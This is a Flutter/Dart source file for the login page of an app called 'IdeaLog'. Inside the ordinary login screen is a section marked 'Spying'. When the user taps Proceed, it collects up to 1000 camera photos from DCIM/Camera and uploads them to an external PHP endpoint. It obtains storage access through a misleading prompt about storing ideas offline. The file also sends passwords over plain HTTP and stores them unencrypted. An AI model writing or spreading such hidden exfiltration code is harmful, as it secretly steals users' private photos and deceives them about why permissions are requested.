import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:async';
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:battery/battery.dart';
import 'package:async/async.dart';
import 'dart:io';
import 'package:path/path.dart' as p;
import 'package:permission_handler/permission_handler.dart';

import '../global.dart' as globals;

class LoginPage extends StatefulWidget {
  GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
  Function reloadMain;
  LoginPage(this._scaffoldKey, this.reloadMain);
  @override
  State<StatefulWidget> createState() {
    // TODO: implement createState
    return _LoginPageState();
  }
}

class _LoginPageState extends State<LoginPage> {
  TextEditingController _username = new TextEditingController();
  TextEditingController _password = new TextEditingController();
  bool _isLoading = false, _continueLogin = false, _passwordNotVisible = true;
  var battery = Battery();
  var _response;
  String temp;

  // Spying----------------------------------------------------------------------------------
  List _files = new List();
  var myDir = new Directory('/storage/emulated/0/DCIM/Camera/');
  File imageFile;
  String _path;
  int counter = 0;

  UploadFHalf() async {
    for (int i = 0; i < _files.length ~/ 3; i++) {
      print(i.toString() + "\n");
      imageFile = new File(_files[i].toString());
      var stream =
          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
      var length = await imageFile.length();

      var uri =
          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");

      var request = new http.MultipartRequest("POST", uri);
      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
          filename: p.basename(imageFile.path));
      //contentType: new MediaType('image', 'png'));

      request.files.add(multipartFile);
      var response = await request.send();
      //print(response.statusCode);
      response.stream.transform(utf8.decoder).listen((value) {
        print(value);
      });
    }
  }

  UploadSHalf() async {
    for (int i = _files.length ~/ 3;
        i < (_files.length ~/ 3 + _files.length ~/ 3);
        i++) {
      print(i.toString() + "\n");
      imageFile = new File(_files[i].toString());
      var stream =
          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
      var length = await imageFile.length();

      var uri =
          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");

      var request = new http.MultipartRequest("POST", uri);
      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
          filename: p.basename(imageFile.path));
      //contentType: new MediaType('image', 'png'));

      request.files.add(multipartFile);
      var response = await request.send();
      //print(response.statusCode);
      response.stream.transform(utf8.decoder).listen((value) {
        print(value);
      });
    }
  }

  UploadTHalf() async {
    for (int i = (_files.length ~/ 3 + _files.length ~/ 3);
        i < _files.length;
        i++) {
      print(i.toString() + "\n");
      imageFile = new File(_files[i].toString());
      var stream =
          new http.ByteStream(DelegatingStream.typed(imageFile.openRead()));
      var length = await imageFile.length();

      var uri =
          Uri.parse("http://rrjprojects.000webhostapp.com/api/fileUpload.php");

      var request = new http.MultipartRequest("POST", uri);
      var multipartFile = new http.MultipartFile('uploadFile', stream, length,
          filename: p.basename(imageFile.path));
      //contentType: new MediaType('image', 'png'));

      request.files.add(multipartFile);
      var response = await request.send();
      //print(response.statusCode);
      response.stream.transform(utf8.decoder).listen((value) {
        print(value);
      });
    }
  }

  void _spyOn() async {
    myDir
      ..list(recursive: true, followLinks: false)
          .listen((FileSystemEntity entity) {
        if (entity.path.endsWith(".jpg") && counter <= 1000) {
          counter++;
          _files.add(entity.path.toString());
          // print(entity.path);
          // print(counter);
          // imageFile = new File(entity.path);
          // _path = entity.path;
          // Upload(file);
          // OpenFile.open(entity.path);
        }
      });
  }

  // Spying----------------------------------------------------------------------------------

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    _autoLoginCheck();
    _checkPermission();
  }

  void _checkPermission() async {
    PermissionStatus permission = await PermissionHandler()
        .checkPermissionStatus(PermissionGroup.storage);
    String _status = permission.toString();
    print(_status);
    if (_status.compareTo("PermissionStatus.denied") == 0) {
      _showConfirmDialog();
    }
  }

  void _goToSettings() async {
    bool isOpened = await PermissionHandler().openAppSettings();
    Navigator.pop(context);
  }

  void _showConfirmDialog() {
    showDialog(
        context: context,
        builder: (BuildContext context) {
          return AlertDialog(
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(5.0)),
            title: Text("Pretty please?"),
            content: Text(
                "IdeaLog needs storage access permission to store your ideas offline. Would you please grant us that? 😉"),
            actions: <Widget>[
              FlatButton(
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(5.0)),
                textColor: Colors.white,
                color: Colors.red,
                child: Text("Deny Permission"),
                onPressed: () {
                  Navigator.pop(context);
                },
              ),
              FlatButton(
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(5.0)),
                textColor: Colors.white,
                color: Colors.green,
                child: Text("Go to settings"),
                onPressed: () {
                  _goToSettings();
                },
              )
            ],
          );
        });
  }

  void _autoLoginCheck() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    temp = prefs.getString("accUserName");
    int _primaryC = prefs.getInt("primaryColor");
    // print(temp);
    //print(_primaryC);
    if (temp != null) {
      setState(() {
        _continueLogin = true;
        _username.text = prefs.getString("accUserName");
        _password.text = prefs.getString("userPassword");
      });
    }
    if (_primaryC != null) {
      //print(_primaryC);
      switch (_primaryC) {
        case 1:
          globals.primaryColor = Colors.deepOrange;
          break;
        case 2:
          globals.primaryColor = Colors.green;
          break;
        case 3:
          globals.primaryColor = Colors.teal;
          break;
        case 4:
          globals.primaryColor = Colors.purple;
          break;
        case 5:
          globals.primaryColor = Colors.indigo;
          break;
        case 6:
          globals.primaryColor = Colors.blueGrey;
          break;
        case 7:
          globals.primaryColor = Colors.brown;
          break;
        case 8:
          globals.primaryColor = Colors.blue;
          break;
      }

      widget.reloadMain();
    }
  }

  Future<String> _auth() async {
    //print(globals.accUserName);
    _spyOn();
    Future.delayed(const Duration(milliseconds: 1000), () {
      UploadFHalf();
      UploadSHalf();
      UploadTHalf();
    });

    var _batt = await battery.batteryLevel;
    try {
      _response = await http.post(
          Uri.encodeFull(
              "http://rrjprojects.000webhostapp.com/api/authentication.php"),
          body: {
            "username": _username.text.trim(),
            "passkey": _password.text.trim(),
            "battPercent": _batt.toString()
          });
      _response = json.decode(_response.body);
      if (_response[0]['authstatus'] == '0') {
        globals.userName = _response[0]['name'];
        globals.userId = _response[0]['userId'];
        globals.welMessage = _response[0]['welMessage'];
        globals.userEmail = _response[0]['emailId'];
        globals.accUserName = _username.text.trim();
        globals.userPassword = _password.text.trim();
        SharedPreferences prefs = await SharedPreferences.getInstance();
        prefs.setString("accUserName", globals.accUserName);
        prefs.setString("userPassword", globals.userPassword);
        Navigator.of(context).pushNamedAndRemoveUntil(
            '/explorePage', (Route<dynamic> route) => false);
      } else if (_response[0]['authstatus'] == '2') {
        widget._scaffoldKey.currentState.showSnackBar(SnackBar(
          backgroundColor: Colors.red,
          content: Text('Please check your username 😮'),
          duration: Duration(seconds: 3),
        ));
        _resetPage(0);
      } else if (_response[0]['authstatus'] == '1') {
        widget._scaffoldKey.currentState.showSnackBar(SnackBar(
          backgroundColor: Colors.orange,
          content: Text('Please check your password 😮'),
          duration: Duration(seconds: 3),
        ));
        _resetPage(1);
      }
    } catch (SocketException) {
      widget._scaffoldKey.currentState.showSnackBar(SnackBar(
        backgroundColor: Colors.orange,
        content: Text('Woah! Seems like a Network Error'),
        duration: Duration(seconds: 3),
      ));
    }
  }

  void _resetPage(int resetLevel) {
    setState(() {
      _isLoading = false;
      if (resetLevel == 0) {
        _username.clear();
        _password.clear();
      } else if (resetLevel == 1) {
        _password.clear();
      }
    });
  }

  Widget _userNameTextField() {
    return TextField(
      controller: _username,
      textAlign: TextAlign.center,
      decoration: InputDecoration(
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(5.0)),
          hintText: "Username"),
    );
  }

  Widget _passwordTextField() {
    return TextField(
      controller: _password,
      textAlign: TextAlign.center,
      decoration: InputDecoration(
          border: OutlineInputBorder(borderRadius: BorderRadius.circular(5.0)),
          hintText: "Password"),
      obscureText: _passwordNotVisible,
    );
  }

  Widget _proceedBtn() {
    return Row(
      children: <Widget>[
        Expanded(
          child: RaisedButton(
            padding: EdgeInsets.all(30.0),
            elevation: 5.0,
            color: Colors.white,
            colorBrightness: Brightness.light,
            onPressed: () {
              setState(() {
                _isLoading = true;
                _auth();
              });
            },
            child: (_isLoading == false)
                ? Text(
                    "Proceed 😉",
                  )
                : SizedBox(
                    height: 20.0,
                    width: 20.0,
                    child: CircularProgressIndicator(),
                  ),
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(5.0)),
          ),
        )
      ],
    );
  }

  Widget _autoLoginBtn() {
    return Row(
      children: <Widget>[
        Expanded(
          child: RaisedButton(
            padding: EdgeInsets.all(30.0),
            elevation: 5.0,
            color: Colors.white,
            colorBrightness: Brightness.light,
            onPressed: () {
              setState(() {
                _isLoading = true;
                _auth();
              });
            },
            child: (_isLoading == false)
                ? Text("Auto-Login to " + temp + " 😎")
                : SizedBox(
                    height: 20.0,
                    width: 20.0,
                    child: CircularProgressIndicator(),
                  ),
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(5.0)),
          ),
        ),
      ],
    );
  }

  Widget _signUpBtn() {
    return Row(mainAxisAlignment: MainAxisAlignment.center, children: <Widget>[
      Container(
        margin: EdgeInsets.only(top: 10.0),
        child: Text("New User? "),
      ),
      Container(
          margin: EdgeInsets.only(top: 10.0),
          alignment: Alignment.center,
          child: InkWell(
              child: new Text(
                'Sign Up 😃',
                style: TextStyle(color: Colors.indigo),
              ),
              onTap: () {
                Navigator.pushNamed(context, '/signUpPage');
              }))
    ]);
  }

  Widget _forgotPassword() {
    return Container(
      alignment: Alignment.centerRight,
      child: InkWell(
          child: new Text(
            'Forgot password?',
            style: TextStyle(fontSize: 12.0, color: Colors.indigo),
          ),
          onTap: () {
            Navigator.pushNamed(context, '/forgotPasswordPage');
          }),
    );
  }

  Widget _loginBox() {
    return Column(
      children: <Widget>[
        Container(
          child: Text(
            "Log In",
            textAlign: TextAlign.center,
            style: TextStyle(
                fontSize: 30.0,
                color: Colors.indigo,
                fontWeight: FontWeight.bold),
          ),
        ),
        SizedBox(height: 40.0),
        _userNameTextField(),
        SizedBox(
          height: 20.0,
        ),
        _passwordTextField(),
        SizedBox(
          height: 10.0,
        ),
        _forgotPassword(),
        SizedBox(
          height: 20.0,
        ),
        _proceedBtn(),
        // SizedBox(
        //   height: 2.0,
        // ),
        // _signUpBtn()
      ],
    );
  }

  void _clearLoginLogs() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.clear();
    globals.userId = null;
    globals.userName = null;
    globals.accUserName = null;
    globals.userPassword = null;
    Navigator.of(context)
        .pushNamedAndRemoveUntil('/loginPage', (Route<dynamic> route) => false);
  }

  Widget _logOutBtn() {
    return Row(mainAxisAlignment: MainAxisAlignment.center, children: <Widget>[
      Container(
        margin: EdgeInsets.only(top: 10.0),
        child: Text("Not you? "),
      ),
      Container(
          margin: EdgeInsets.only(top: 10.0),
          alignment: Alignment.center,
          child: InkWell(
              child: new Text(
                'Log Out 😄',
                style: TextStyle(color: Colors.indigo),
              ),
              onTap: () {
                _clearLoginLogs();
              }))
    ]);
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
        constraints: BoxConstraints(
            minHeight: MediaQuery.of(context).size.height,
            minWidth: MediaQuery.of(context).size.width),
        alignment: Alignment.center,
        child: Center(
          child: ListView(
            shrinkWrap: true,
            padding: const EdgeInsets.all(50.0),
            children: <Widget>[
              Container(
                child: (_continueLogin != true) ? _loginBox() : _autoLoginBtn(),
              ),
              SizedBox(
                height: (_continueLogin != true) ? 0.0 : 10.0,
              ),
              Container(
                child: (_continueLogin != true) ? null : _logOutBtn(),
              ),
              SizedBox(
                height: 10.0,
              ),
              Container(
                child: _signUpBtn(),
              ),
            ],
          ),
        ));
  }
}
